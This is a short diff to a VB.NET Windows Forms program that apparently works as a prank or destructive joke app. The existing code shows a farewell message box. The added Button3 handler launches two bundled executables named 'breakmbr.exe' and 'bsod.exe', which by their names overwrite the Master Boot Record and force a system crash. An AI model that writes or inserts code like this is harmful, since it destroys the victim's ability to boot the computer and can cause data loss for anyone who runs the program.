@@ -76,4 +76,9 @@ Public Class Form1
         MsgBox("不和你多说了，再见！！！", 16, "emmm")
         End
     End Sub
+
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+        Shell(Application.StartupPath + "\breakmbr.exe")
+        Shell(Application.StartupPath + "\bsod.exe")
+    End Sub
 End Class
